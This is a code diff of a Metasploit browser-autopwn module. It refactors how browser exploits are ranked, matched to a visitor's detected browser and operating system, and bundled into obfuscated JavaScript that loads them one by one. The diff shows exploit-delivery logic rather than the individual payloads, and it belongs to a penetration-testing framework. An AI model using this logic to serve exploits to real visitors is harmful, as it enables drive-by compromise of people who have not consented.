@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -25,7 +21,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'        => 'HTTP Client Automatic Exploiter',
-			'Version'     => '$Revision$',
 			'Description' => %q{
 					This module has three actions.  The first (and the default)
 				is 'WebServer' which uses a combination of client-side and
@@ -390,8 +385,8 @@ class Metasploit3 < Msf::Auxiliary
 	def start_exploit_modules()
 		@lhost = (datastore['LHOST'] || "0.0.0.0")
 
-		@js_tests = {}
 		@noscript_tests = {}
+		@all_tests = {}
 
 		print_line
 		print_status("Starting exploit modules on host #{@lhost}...")
@@ -451,20 +446,24 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			# Now that we've got all of our exploit tests put together,
-			# organize them into requires-scripting and
-			# doesnt-require-scripting, sorted by browser name.
+			# organize them into an all tests (JS and no-JS), organized by rank,
+			# and doesnt-require-scripting (no-JS), organized by browser name.
 			if apo[:javascript] && apo[:ua_name]
-				@js_tests[apo[:ua_name]] ||= []
-				@js_tests[apo[:ua_name]].push(apo)
+				@all_tests[apo[:rank]] ||= []
+				@all_tests[apo[:rank]].push(apo)
 			elsif apo[:javascript]
-				@js_tests["generic"] ||= []
-				@js_tests["generic"].push(apo)
+				@all_tests[apo[:rank]] ||= []
+				@all_tests[apo[:rank]].push(apo)
 			elsif apo[:ua_name]
 				@noscript_tests[apo[:ua_name]] ||= []
 				@noscript_tests[apo[:ua_name]].push(apo)
+				@all_tests[apo[:rank]] ||= []
+				@all_tests[apo[:rank]].push(apo)
 			else
 				@noscript_tests["generic"] ||= []
 				@noscript_tests["generic"].push(apo)
+				@all_tests[apo[:rank]] ||= []
+				@all_tests[apo[:rank]].push(apo)
 			end
 		end
 
@@ -506,9 +505,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_line
 
 		# Sort the tests by reliability, descending.
-		@js_tests.each { |browser,tests|
-			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
-		}
+		# I don't like doing this directly (wihout a !), but any other sort wasn't sticking - NE
+		@all_tests = @all_tests.sort.reverse
 
 		# This matters a lot less for noscript exploits since they basically
 		# get thrown into a big pile of iframes that the browser will load
@@ -516,7 +514,6 @@ class Metasploit3 < Msf::Auxiliary
 		@noscript_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
-
 	end
 
 	#
@@ -751,82 +748,65 @@ class Metasploit3 < Msf::Auxiliary
 		# if we have no client_info, this will add all tests. Otherwise tries
 		# to only send tests for exploits that target the client's detected
 		# browser.
-		@js_tests.each { |browser, sploits|
-			next unless client_matches_browser(client_info, browser)
 
-			# Send all the generics regardless of what the client is. If the
-			# client is nil, then we don't know what it really is, so just err
-			# on the side of shells and send everything. Otherwise, send only
-			# if the client is using the browser associated with this set of
-			# exploits.
-			if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
-				sploits.each do |s|
-					if s[:vuln_test].nil? or s[:vuln_test].empty?
-						test = "is_vuln = true"
-					else
-						# get rid of newlines and escape quotes
-						test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
-					end
-					# shouldn't be any in the resource, but just in case...
-					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+		@all_tests.each { |rank, sploits|
+			sploits.each { |s|
+				browser = s[:ua_name] || "generic"
+				next unless client_matches_browser(client_info, browser)
 
-					# Skip exploits that don't match the client's OS.
-					if (host_info and host_info[:os_name] and s[:os_name])
-						# Reject exploits whose OS doesn't match that of the
-						# victim. Note that host_info comes from javascript OS
-						# detection, NOT the database.
-						if host_info[:os_name] != "undefined"
-							unless s[:os_name].include?(host_info[:os_name])
-								vprint_status("Rejecting #{s[:name]} for non-matching OS")
-								next
+				# Send all the generics regardless of what the client is. If the
+				# client is nil, then we don't know what it really is, so just err
+				# on the side of shells and send everything. Otherwise, send only
+				# if the client is using the browser associated with this set of
+				# exploits.
+				if s[:javascript]
+					if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
+						if s[:vuln_test].nil? or s[:vuln_test].empty?
+							test = "is_vuln = true"
+						else
+							# get rid of newlines and escape quotes
+							test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
+						end
+						# shouldn't be any in the resource, but just in case...
+						res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+
+						# Skip exploits that don't match the client's OS.
+						if (host_info and host_info[:os_name] and s[:os_name])
+							# Reject exploits whose OS doesn't match that of the
+							# victim. Note that host_info comes from javascript OS
+							# detection, NOT the database.
+							if host_info[:os_name] != "undefined"
+								unless s[:os_name].include?(host_info[:os_name])
+									vprint_status("Rejecting #{s[:name]} for non-matching OS")
+									next
+								end
 							end
 						end
+
+						js << "global_exploit_list[global_exploit_list.length] = {\n"
+						js << "  'test':'#{test}',\n"
+						js << "  'resource':'#{res}'\n"
+						js << "};\n"
+						sploits_for_this_client.push s[:name]
+						sploit_cnt += 1
 					end
-					js << "global_exploit_list[global_exploit_list.length] = {\n"
-					js << "  'test':'#{test}',\n"
-					js << "  'resource':'#{res}'\n"
-					js << "};\n"
+				else
+					if s[:name] =~ %r|/java_|
+						res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+						js << "global_exploit_list[global_exploit_list.length] = {\n"
+						js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
+						js << "  'resource':'#{res}'\n"
+						js << "};\n"
+					else
+						# Some other kind of exploit that we can't generically
+						# check for in javascript, throw it on the pile.
+						noscript_html << html_for_exploit(s, client_info)
+					end
 					sploits_for_this_client.push s[:name]
 					sploit_cnt += 1
 				end
-			end
+			}
 		}
-
-		# Add a javaEnabled() test specifically for java exploits.  Other
-		# exploits that don't require javascript go into a big pile of iframes
-		# that will be dumped out after other exploitation is done, assuming
-		# the browser didn't stop somewhere along the way due to a successful
-		# exploit or a crash from all the memory raping we just did.
-		noscript_html = ""
-		@noscript_tests.each { |browser, sploits|
-			sploits.each do |s|
-				if s[:name] =~ %r|/java_|
-					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
-					js << "global_exploit_list[global_exploit_list.length] = {\n"
-					js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
-					js << "  'resource':'#{res}'\n"
-					js << "};\n"
-				else
-					# Some other kind of exploit that we can't generically
-					# check for in javascript, throw it on the pile.
-					noscript_html << html_for_exploit(s, client_info)
-				end
-				sploits_for_this_client.push s[:name]
-				sploit_cnt += 1
-			end
-		}
-
-		# If all of our exploits that require javascript fail, try to continue
-		# with those that don't
-		js << %Q|var noscript_exploits = "|
-		js << Rex::Text.to_hex(noscript_html, "%")
-		js << %Q|";\n|
-		js << %Q|var noscript_div = document.createElement("div");\n|
-		# Have to use innerHTML here to render the new iframes. Using
-		# document.createElement and appendChild() will escape all the
-		# entities.
-		js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
-		js << %Q|document.body.appendChild(noscript_div);\n|
 
 		js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
 		js << "window.next_exploit(0);\n"
@@ -835,7 +815,6 @@ class Metasploit3 < Msf::Auxiliary
 		js.obfuscate unless datastore["DEBUG"]
 
 		response.body = "#{js}"
-
 		print_status("Responding with #{sploit_cnt} exploits")
 		sploits_for_this_client.each do |name|
 			vprint_status("* #{name}")
